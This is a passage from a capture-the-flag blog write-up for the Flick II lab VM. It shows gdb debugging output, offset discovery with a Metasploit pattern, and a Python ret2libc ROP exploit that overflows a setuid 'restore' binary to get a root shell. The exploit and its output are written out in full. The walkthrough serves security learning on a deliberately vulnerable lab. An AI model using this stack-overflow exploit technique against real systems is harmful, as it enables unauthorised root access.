+RAX: 0x7ffcf5bc8780 (&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag&quot;...)
+RBX: 0x400310 (&lt;_init&gt;:	sub    rsp,0x8)
+RCX: 0x7ffffdf6 
+RDX: 0x6bf600 --&gt; 0x0 
+RSI: 0x7fc6d9cde000 (&quot;Output directory is: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af&quot;...)
+RDI: 0x0 
+RBP: 0x3363413263413163 ('c1Ac2Ac3')
+RSP: 0x7ffcf5bc87c8 (&quot;Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj&quot;...)
+RIP: 0x40101f (&lt;get_out_path+62&gt;:	ret)
+R8 : 0x7141357141347141 ('Aq4Aq5Aq')
+R9 : 0x4136704135704134 ('4Ap5Ap6A')
+R10: 0x1f4 
+R11: 0x246 
+R12: 0x0 
+R13: 0x401710 (&lt;__libc_csu_init&gt;:	push   r14)
+R14: 0x4017a0 (&lt;__libc_csu_fini&gt;:	push   rbx)
+R15: 0x0
+EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+
+gdb-peda$ x/wx $rsp
+0x7ffcf5bc87c8:	0x41346341
+
+root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x41346341
+[*] Exact match at offset 72
+</code></pre>
+
+<p>Test that offset.</p>
+
+<pre><code class="language-text">root@kali:~# python -c 'print &quot;/root/\n&quot; + &quot;A&quot; * 72 + &quot;BBBBBB&quot;' &gt; exploit 
+
+gdb-peda$ r &lt; exploit 
+
+Stopped reason: SIGSEGV
+0x0000424242424242 in ?? ()
+</code></pre>
+
+<p>With <code>NX</code> enabled, I like to go for a nice <code>ret2libc</code>.  So to do that, I first need the address of system.</p>
+
+<pre><code class="language-text">gdb-peda$ p system
+$1 = {&lt;text variable, no debug info&gt;} 0x401fd0 &lt;system&gt;
+</code></pre>
+
+<p>In 64-bit, parameters are passed in registers. So I need to occupy the <code>RDI</code> register with <code>/bin/sh</code> - to do this, I&rsquo;ll use a ROP gadget to pop (rdi) the string &lsquo;/bin/sh&rsquo; from the stack.  The string itself is easy enough to find.</p>
+
+<pre><code class="language-text">gdb-peda$ find '/bin/sh'
+Searching for '/bin/sh' in: None ranges
+Found 2 results, display max 2 items:
+restore : 0x492bad --&gt; 0x68732f6e69622f ('/bin/sh')
+restore : 0x492d20 --&gt; 0x68732f6e69622f ('/bin/sh')
+</code></pre>
+
+<p>To find the gadget, I used <code>ropper</code>.</p>
+
+<pre><code class="language-text">root@kali:~# ropper --file restore --search &quot;pop rdi&quot;
+</code></pre>
+
+<p>There&rsquo;s a perfect instruction here: <code>0x000000000040167e: pop rdi; ret;</code>.</p>
+
+<p>Now to build the exploit&hellip;</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+from struct import *
+
+buf = &quot;&quot;
+buf = &quot;/root/\n&quot;
+buf += &quot;A&quot; * 72                         # junk
+buf += pack(&quot;&lt;Q&quot;, 0x000000000040167e)   # pop rdi; ret
+buf += pack(&quot;&lt;Q&quot;, 0x492bad)             # /bin/sh
+buf += pack(&quot;&lt;Q&quot;, 0x0000000000401fd0)   # system
+
+f = open(&quot;exploit&quot;, &quot;w&quot;)
+f.write(buf)
+</code></pre>
+
+<pre><code class="language-text">root@kali:~# ./exploit.py 
+
+root@kali:~# (cat exploit; cat) | ./restore 
+Restore tool v0.1
+Enter the path to the backup.tar.gz: Path is: /root/
+
+Enter the output directory: Output directory is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA~@
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<p>Seems to work locally&hellip; Transfer it across to Flick II (and change /root/ to /tmp/).</p>
+
+<pre><code class="language-text">[sean@fII tmp]$ ls -l
+
+-rw-rw-r-- 1 sean  sean     0 Sep  8 22:37 backup.tar.gz
+-rw-rw-r-- 1 sean  sean   102 Sep  8 23:00 exploit
+-rwxrwxr-x 1 sean  sean   274 Sep  8 23:00 exploit.py
+-rwxrwxr-x 1 robin robin 8034 Sep  8 22:00 rand.so
+
+[sean@fII tmp]$ (cat exploit; cat) | /usr/local/bin/restore
+
+id; whoami
+uid=0(root) gid=0(root) groups=0(root),1001(bryan),1002(sean)
+root
+</code></pre>
+
+<h2 id="flag:97d1000c18ea8816fa1721a8cb10b128">Flag</h2>
+
+<pre><code class="language-text">cat /root/flag
+
+  █████▒██▓     ██▓ ▄████▄   ██ ▄█▀ ██▓ ██▓
+▓██   ▒▓██▒    ▓██▒▒██▀ ▀█   ██▄█▒ ▓██▒▓██▒
+▒████ ░▒██░    ▒██▒▒▓█    ▄ ▓███▄░ ▒██▒▒██▒
+░▓█▒  ░▒██░    ░██░▒▓▓▄ ▄██▒▓██ █▄ ░██░░██░
+░▒█░   ░██████▒░██░▒ ▓███▀ ░▒██▒ █▄░██░░██░
+ ▒ ░   ░ ▒░▓  ░░▓  ░ ░▒ ▒  ░▒ ▒▒ ▓▒░▓  ░▓  
+ ░     ░ ░ ▒  ░ ▒ ░  ░  ▒   ░ ░▒ ▒░ ▒ ░ ▒ ░
+ ░ ░     ░ ░    ▒ ░░        ░ ░░ ░  ▒ ░ ▒ ░
+           ░  ░ ░  ░ ░      ░  ░    ░   ░  
+                   ░                       
+
+ You have successfully completed FlickII!
+
+ I hope you learnt as much as I did while
+ making it! Any comments/suggestions etc,
+ feel free to catch me on freenode in
+ #vulnhub or on twitter @leonjza
+</code></pre>
+
+<p>Many thanks to leonjza for a brilliant VM - one of my favourites to date.  Shout-out to <a href="https://twitter.com/superkojiman">superkojiman</a> for his excellent <a href="http://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/">64-bit Stack Smashing Tutorial</a> which came in super-handy for this final exercise.</p>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2015  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
